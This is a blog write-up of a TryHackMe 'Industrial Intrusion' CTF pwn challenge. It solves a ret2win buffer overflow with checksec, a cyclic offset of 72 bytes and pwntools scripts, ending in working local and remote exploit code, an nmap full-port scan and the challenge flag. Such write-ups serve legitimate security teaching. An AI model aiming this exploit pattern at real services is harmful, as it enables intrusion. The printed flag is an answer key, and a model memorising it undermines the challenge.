---
layout: post
title: "THM Industrial Intrusion CTF: Buffer Overflow Exploit on start Binary"
date: 2025-06-30
categories: [pwn, ctf, writeup]
tags: [buffer-overflow, pwntools, elf, ret2win, tryhackme]
author: Michael Khanda
---

**Category**: Pwn  
**CTF**: TryHackMe — Industrial Intrusion  
**Difficulty**: Medium

## Challenge Overview

A water control facility hit by malware three months ago. A persistent second-stage implant remains hidden in the OT environment. Objective: infiltrate the system and extract the flag before the attacker reactivates control.

> "A stray input at the operator console is all it needs. Buffers break, execution slips, and control pivots."

## Step 1: Binary Analysis

```bash
wget http://10.10.229.193/Start/start.zip
unzip start.zip -d start_pwn
cd start_pwn
file start
checksec --file=start
nm -C start | grep ' T '
```

Security analysis results:
- 64-bit ELF executable
- NX (No eXecute) enabled
- **No stack canary**
- **No PIE** — allows hardcoded address exploitation
- Symbols not stripped

## Step 2: Function Discovery

Key functions from symbol table:

```
0000000000401298  main
0000000000401216  print_flag
```

`print_flag` at `0x401216` is the target.

## Step 3: Find the Offset

```python
from pwn import *
print(cyclic(100))
```

Run the binary with the cyclic pattern, observe the crash offset. Result: **72 bytes** before the return address.

## Step 4: Local Exploit

```bash
echo 'THM{buffer_overflow_pwned}' > flag.txt
```

```python
from pwn import *

p = process('./start')

offset = 72
print_flag_addr = 0x401216

payload = b"A" * offset + p64(print_flag_addr) + p64(0x0)

p.sendlineafter("Enter your username:", payload)
p.interactive()
```

Local flag retrieved successfully.

## Step 5: Remote Recon

```bash
nmap -sV -p- 10.10.68.1
```

Service found on **port 9008**.

## Step 6: Remote Exploit

```python
from pwn import *

p = remote('10.10.68.1', 9008)

offset = 72
print_flag_addr = 0x401216

payload = b"A" * offset + p64(print_flag_addr) + p64(0x0)

p.sendlineafter("Enter your username:", payload)
p.interactive()
```

## Flag

```
THM{nice_place_t0_st4rt}
```

## Key Takeaways

- Always run `checksec` first — the absence of PIE and stack canaries tells you a lot
- No PIE means function addresses are static and usable directly in the payload
- Build and test locally before pointing at the remote target
- `pwntools` `p64()` handles little-endian packing automatically
